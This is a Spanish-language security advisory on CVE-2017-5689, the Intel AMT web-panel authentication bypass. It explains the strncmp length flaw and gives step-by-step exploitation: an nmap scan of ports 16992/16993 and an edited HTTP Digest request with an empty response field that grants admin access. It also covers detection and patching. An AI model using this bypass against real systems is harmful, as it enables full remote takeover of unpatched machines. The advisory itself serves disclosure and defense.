![Entry banner](http://i.imgur.com/PK2VyjZ.png "Entry banner")

# Authentication Bypass Intel's AMT (CVE-2017-5689)
---
## Ficha de vulnerabilidad
  %|%
------- | -------
**CVE:**            | CVE-2017-5689
**Severidad:**      | Critico
**Vector**          | [(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Descubierto por:**| Maksim Malyutin from Embedi.
**Afecta a:**       | Intel's AMT Web-panel Interface
**Fuentes:**        | https://www.theregister.co.uk/2017/05/05/intel_amt_remote_exploit/
~                   | http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5689
~                   | https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf
~                   | http://www.kb.cert.org/vuls/id/491375
**Exploit Disponible:** | Explotación mediante Proxy
**Fecha Exposición:** | 02/mayo/2017

## Resumen a alto nivel
---
La empresa Intel provee a ciertos equipos [(ver listado)](http://www.securityfocus.com/bid/98269/info) la capacidad de administrarlos mediante una interfaz web llamada Intel's AMT (Active Management Technology). Esta interfaz está presente en algunos equipos y es accesible desde la red. Al momento de acceder a esta interfaz web, la cual es independiente del sistema operativo, solicita las credenciales administrativas para iniciar sesión y tomar control del equipo, sin embargo Maksim Malyutin de Embedi encontró una vulnerabilidad que permite saltar esta autenticación y acceder directamente a la interfaz y tomar **completo control del servidor**.

Esta vulnerabilidad es de severidad **crítica** y puede comprometer de manera completa un servidor vulnerable a ella. Esta vulnerabilidad fue comprobada por el equipo de Cybertheat Chile y es bastante trivial de explotar.

### Contexto de ataque
Si un atacante es capaz de acceder vía red (Local o desde internet) a la interfaz web de Intel AMT tendrá control total del equipo en cuestión.

### Potenciales Servidores vulnerables en Latino América
Utilizando la información que posee el escaneador masivo [Shodan.io](https://www.shodan.io/), se detectan las siguientes  amenazas en Latino America:
![paises](http://i.imgur.com/L0OBMU3.png)

## Recomendación
Se recomienda realizar una inspección de todos los equipos y servidores de la compañía que pudiesen tener habilitado la interfaz web de Intel AMT y actualizar a la última versión disponible desde la página del fabricante.

# Explicación técnica
---
La vulnerabilidad reside en cómo el firmware encargado de publicar la aplicación web Intel AMT realiza la comprobación de contraseña. Sinceramente el ataque es bastante trivial. Vamos a la explicación.

Tal como se explicó en el resumen de alto nivel, existe una interfaz web (que no muchos están conscientes de que existe) la cual permite al usuario autenticado tener control completo del equipo, esto incluye reiniciar la máquina, reinstalar el sistema operativo base, acceder la consola e incluso tomar control remoto del equipo vía VNC. Lo interesante es que esta aplicación web existe de manera independiente al sistema operativo que esté ejecutando la máquina (Windows o Linux) ya que reside en el firmware del procesador.

Es posible acceder la interfaz web con cualquier browser desde la dirección `http://ip:16992` ó `http://ip:16993`, ya sea de manera local o remota. Al entrar en aquella dirección URL aparecerá un prompt de BASIC HTTP Authentication[(1)](https://en.wikipedia.org/wiki/Basic_access_authentication) la cual solicitará un usuario y contraseña para acceder a la interfaz administrativa.

El investigador de seguridad Maksim Malyutin hace años descubrió una vulnerabilidad en el sistema de autenticación mediante un proceso de ingeniería inversa (ver [white-paper](https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf) para el detalle) la cual le permitió bypasear completamente el sistema de inicio de sesión y así tomar control de la interfaz web AMT de Intel.

Lo que descubrió Maksim fué la función encargada de realizar la comprobación de la contraseña llegando al siguiente código:
```C
if(strncmp(computed_response, user_response, response_length))
    exit(0x99);
```
Si inspeccionamos bien la función `strncmp` (ver [docs](https://helpmanual.io/man3/strncmp/)) en el código anterior lo que hace es verificar que la variable `compute_response` sea equivalente a `user_response`, representando `user_response` lo ingresado por el usuario y `compute_repsonse` lo que espera el servidor (hash de contraseña correcta), sin embargo la función comprobará hasta `n` caracteres indicado por la variable `response_lenght`, es acá donde se encuentra la vulnerabilidad.

El valor de `response_lenght` es calculado en base a la variable `user_response` enviada por el usuario, por lo que si se envía una contraseña de largo cero-bytes, internamente la variable `response_lenght` será igual a 0, indicando que no es necesario comparar ningún caracter y así, entregando acceso a toda la plataforma dado que `strncmp` retornará 0 y el `exit(0x99)` no se ejecutará y continuará su ejecución.

### Explotación
Si se analiza la respuesta el request enviado desde el web-cliente hacia el servidor encontraremos lo siguiente:

**Request HTTP normal:**
```http
GET /index.htm HTTP/1.1

Host: XXX.XXX.XXX.XXX:16992
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://XXX.XXX.XXX.XXX:16992/logon.htm
Connection: close

Authorization: Digest username="admin", realm="Digest:xxxxxxxxxxxx", nonce="OHgyVOyxVzHgqImVUNWkwgrZLhlGICkj", uri="/index.htm", response="XnFgD1KcOh4TcfFEeP05xcDSppwlfUH8 ", qop=auth, nc=00000001, cnonce="dTB7UCCOU3VRuq0w "
```

En el payload del request HTTP interesa la variable `response="XnFgD1KcOh4TcfFEeP05xcDSppwlfUH8"` que es la representación de la contraseña que acabamos de ingresar antes de interceptar el request. Si eliminamos el contenido y enviamos un response vació (`response=""`) la variable interna `response_lenght` será equivalente a cero y permitirá entrar a la interfaz administrativa.

**Request HTTP editado:**
```http
GET /index.htm HTTP/1.1

Host: XXX.XXX.XXX.XXX:16992
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://XXX.XXX.XXX.XXX:16992/logon.htm
Connection: close

Authorization: Digest username="admin", realm="Digest:xxxxxxxxxxxx", nonce="OHgyVOyxVzHgqImVUNWkwgrZLhlGICkj", uri="/index.htm", response="", qop=auth, nc=00000001, cnonce="dTB7UCCOU3VRuq0w "
```

**Web Compromise:**
![compromise](http://i.imgur.com/TgCZ8IA.png)
Así de simple, así de sencillo.


### Escenarios de ataque
Para que esto funcione necesitamos:
* Acceso remoto al equipo mediante el puerto `16992` o `16993` 
    > **hint: nmap -sS -p 16992,16993 -vv <host_ip>**
* Interceptar el request HTTP y eliminar el contenido de la variable response=""

### Detección de la vulnerabilidad
Intel publicó una aplicación para detectar la presencia del CVE-2017-5689, la cual puedes encontrar en el siguiente enlace: https://downloadcenter.intel.com/download/26755

### Mitigación
Se recomienda seguir la guía del fabricante INTEL: https://downloadcenter.intel.com/download/26754


